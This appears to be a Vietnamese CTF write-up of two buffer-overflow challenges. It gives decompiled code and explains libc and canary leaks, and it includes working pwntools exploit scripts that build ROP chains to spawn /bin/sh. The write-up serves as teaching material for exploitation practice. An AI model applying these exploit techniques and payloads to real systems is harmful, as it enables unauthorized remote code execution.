# bof4chall1

## IDA

```c
int menu()
{
  puts("1. Add song name");
  puts("2. Play songs");
  puts("3. Exit");
  return printf("> ");
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+8h] [rbp-88h] BYREF
  __int64 buf[6]; // [rsp+10h] [rbp-80h] BYREF
  __int64 v6[10]; // [rsp+40h] [rbp-50h] BYREF

  memset(v6, 0, sizeof(v6));
  memset(buf, 0, sizeof(buf));
  init(argc, argv, envp);
  puts("Welcome to MP3 Player");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        __isoc99_scanf("%lu", &v4);
        getchar();
        if ( v4 != 1 )
          break;
        printf("Enter new song: ");
        read(0, buf, 32uLL);
        printf("URL: ");
        read(0, v6, 160uLL);
      }
      if ( v4 != 2 )
        break;
      printf("Song: %s\n", (const char *)buf);
      puts("Still implementing...");
    }
    if ( v4 == 3 )
      break;
    puts("Invalid option!");
  }
  return 0;
}
```

## Ý tưởng

- Định hướng bài nay ta có thể dùng ROP.
- Ta sẽ leak libc để lấy chuỗi /bin/sh vì trong chương trình không có /bin/sh
- tiếp theo sẽ sử dụng ROP để lấy các pop cần thiết, lưu ý pop_rax

## Khai thác

### Leak libc

- Ta chọn option 1 vì nó có lỗi BOF
- Offset là 88
- Do là ghi đè ở ret main nên ta phải chọn option 3 để có thể leak =)))

```python
p.sendlineafter(b'> ', b'1')

payload = b'A'

p.sendafter(b'song: ', payload)

payload = b'A'*88
payload += p64(pop_rdi_exe) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
p.sendafter(b'URL: ', payload)

p.sendlineafter(b'> ', b'3')
```

- Tính toán libc base

```python
libc_leak = u64(p.recv(6) + b'\0\0')
log.info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
log.info("libc base: " + hex(libc.address))
```

## ROP

```python
p.sendlineafter(b'> ', b'1')

payload = b'A'

p.sendafter(b'song: ', payload)

#ret = 0x000000000040101a
pop_rdi = 0x0000000000401463
pop_rsi_r15 = 0x00000000004011d6
pop_rdx = 0x00000000004011d8
pop_rax = 0x0000000000401148
syscall = 0x00000000004011dd

payload1 = b'A'*88
payload1 += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload1 += p64(pop_rsi_r15) + p64(0) + p64(0)
payload1 += p64(pop_rdx) + p64(0)
payload1 += p64(pop_rax) + p64(0x3b)
payload1 += p64(syscall)

p.sendafter(b'URL: ', payload1)
p.sendlineafter(b'> ', b'3')

```

- rax của bài này hơi khác xíu nhưng ta vẫn có thể sử dụng được
- Nếu để pop_rax như này thì nó lỗi, sau khi tìm hiểu thì nó sẽ gây lỗi nếu rax ở dưới thì nó sẽ cộng thêm vào rax, do đó e thử chuyển lên đầu thì nó ổn

```python
payload1 = b'A'*88
payload1 += p64(pop_rax) + p64(0x3b)
payload1 += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload1 += p64(pop_rsi) + p64(0)
payload1 += p64(pop_rdx) + p64(0)
payload1 += p64(syscall)
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/230180934-452b0357-b919-45b4-8bfe-54aef5250303.png)

---

# bof4chall2

## IDA

```c
unsigned __int64 vuln()
{
  char buf; // [rsp+7h] [rbp-39h] BYREF
  char s[8]; // [rsp+8h] [rbp-38h] BYREF
  void *v3; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-28h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v5 = v4;
  puts("What's your name ?");
  read(0, &buf, 0x100uLL);
  printf("Hello ");
  puts(s);
  puts("What is rop ?");
  read(0, &v3, 0x100uLL);
  puts("Can you change the saved rip when canary is enabled?");
  read(0, v3, 0x38uLL);
  return __readfsqword(0x28u) ^ v4;
}
```

## Ý tưởng

- Bài này cung cấp cho ta đủ các pop nên khác là dễ dàng, chỉ thiếu chuỗi /bin/sh
- Ở đây ta thấy chỗ này
  ![image](https://user-images.githubusercontent.com/111769169/230182136-b9b7eae1-6830-4153-921a-0e60e5a243f8.png)
- việc chắc chắn ta phải làm là ghi đè byte 0x00 của canary để %s in ra canary, tuy vậy ta thấy nó có thể leak địa chỉ stack =))
- Vậy chỉ cần payload của ta có /bin/sh và từ địa chỉ ta leak được ta sẽ tính được địa chỉ chứa chuỗi /bin/sh
- Nhưng bài này không dễ ăn =))

## Khai thác

### leak canary, stack

- Do %s in ra buf mà buf có lỗi BOF, có thể ghi đè byte 0x00 của canary để %s in được canary và stack

```python
    payload = b"a" * 50
    r.sendafter(b"name ?\n", payload)
    r.recvuntil(b"a" * 48)
    canary = u64(r.recv(8)) - 0x61
    log.info("canary: " + hex(canary))
    stack = u64(r.recv(6) + b"\0\0")
    log.info("stack: " + hex(stack))
    ow_canary = stack - 24
    log.info("addr canary: " + hex(ow_canary))
```

- Do là lần nhập thứ 2 ta thấy code C, hàm read truyền vào địa chỉ, do đó nếu ta đưa vào địa chỉ stack chứa canary, để lần thứ 3 ta ghi lại canary
- Đó là lí do tại sao ta cần phải tính `ow_canary = stack - 72`

```c
  puts("What is rop ?");
  read(0, &v3, 0x100uLL);
```

```python
    r.sendafter(b"rop ?\n", p64(ow_canary))

    payload = p64(canary) + b"a" * 8 + p64(exe.sym['main'] + 5)
    r.sendafter(b"enabled?\n", payload)
```

- Tuy nhiên ta bị lỗi canary bị ghi đè mặc dù ta đã ghi đè đúng

  ![image](https://user-images.githubusercontent.com/111769169/230187261-cad003d5-c0d2-4252-b9f0-c42610b3a5f0.png)
  ![image](https://user-images.githubusercontent.com/111769169/230187415-12239a4b-1445-4635-b82d-b525a780f898.png)

- Do đó ta cần phải debug cẩn thận, ta thấy có chỗ check canary và đề so sánh với rax

  ![image](https://user-images.githubusercontent.com/111769169/230187849-6f083d96-93db-4863-bde7-0e4ddb1153da.png)

- ta tìm địa chỉ mà chương trình lấy để xor với canary
  ![image](https://user-images.githubusercontent.com/111769169/230188756-dbfe97b7-3c7e-4c14-9cac-4e2c2d54674c.png)
- Vậy ta cần phải ghi đè ở chỗ trong hình, offset là -56 so với stack ta leak nên cần chỉnh lại script một tí

```python
    payload = b"a" * 50
    r.sendafter(b"name ?\n", payload)
    r.recvuntil(b"a" * 48)
    canary = u64(r.recv(8)) - 0x61
    log.info("canary: " + hex(canary))
    stack = u64(r.recv(6) + b"\0\0")
    log.info("stack: " + hex(stack))

    ow_canary = stack - 56
    r.sendafter(b"rop ?\n", p64(ow_canary))
```

- Từ đó ta pading đến canary thứ 2 vài ghi lại, cuối cùng là ret về main

```python
    payload = p64(canary) + b"a" * 40 + p64(exe.sym['main'] + 5)
    r.sendafter(b"enabled?\n", payload)
```

## chèn chuỗi /bin/sh và đưa shell

- Do có một byte "a" ở trên nên ta sẽ pading byte đó vào đưa /bin/sh vào cùng 1 dãy, thì offset là -72 so với stack mình leak

![image](https://user-images.githubusercontent.com/111769169/230191553-9616c22c-96f4-46a8-a13a-f9d8f3821d73.png)

```python
    pop_rdi = 0x00000000004013b3
    pop_rdx = 0x00000000004011f6
    pop_rsi = 0x00000000004013b1
    pop_rax = 0x00000000004011fa
    syscall = 0x00000000004011f8
    binsh = stack - 72
    shell = flat(
        pop_rdi, binsh,
        pop_rdx, 0,
        pop_rsi, 0, 0,
        pop_rax, 0x3b,
        syscall,
        0x3b

    )
    payload = b"a"
    payload += b"/bin/sh\0"
    payload += b"a" * 8 + p64(canary)
    payload = payload.ljust(65)
    payload += shell
    r.sendafter(b"name ?\n", payload)

    r.sendafter(b"rop ?\n", b"a")
    r.sendafter(b"enabled?\n", b"b")
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/230192428-510a12c9-befd-4d58-82db-5e06b3d81e57.png)

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./bof4chall2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*vuln+65
                   b*vuln+162
                   c
                   ''')
        input()
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    payload = b"a" * 50
    r.sendafter(b"name ?\n", payload)
    r.recvuntil(b"a" * 48)
    canary = u64(r.recv(8)) - 0x61
    log.info("canary: " + hex(canary))
    stack = u64(r.recv(6) + b"\0\0")
    log.info("stack: " + hex(stack))
    ow_canary = stack - 56
    log.info("addr canary: " + hex(ow_canary))

    r.sendafter(b"rop ?\n", p64(ow_canary))

    payload = p64(canary) + b"a" * 40 + p64(exe.sym['main'] + 5)
    r.sendafter(b"enabled?\n", payload)

    pop_rdi = 0x00000000004013b3
    pop_rdx = 0x00000000004011f6
    pop_rsi = 0x00000000004013b1
    pop_rax = 0x00000000004011fa
    syscall = 0x00000000004011f8
    binsh = stack - 72
    shell = flat(
        pop_rdi, binsh,
        pop_rdx, 0,
        pop_rsi, 0, 0,
        pop_rax, 0x3b,
        syscall,
        0x3b

    )
    payload = b"a"
    payload += b"/bin/sh\0"
    payload += b"a" * 8 + p64(canary)
    payload = payload.ljust(65)
    payload += shell
    r.sendafter(b"name ?\n", payload)

    r.sendafter(b"rop ?\n", b"a")
    r.sendafter(b"enabled?\n", b"b")
    r.interactive()


if __name__ == "__main__":
    main()
```
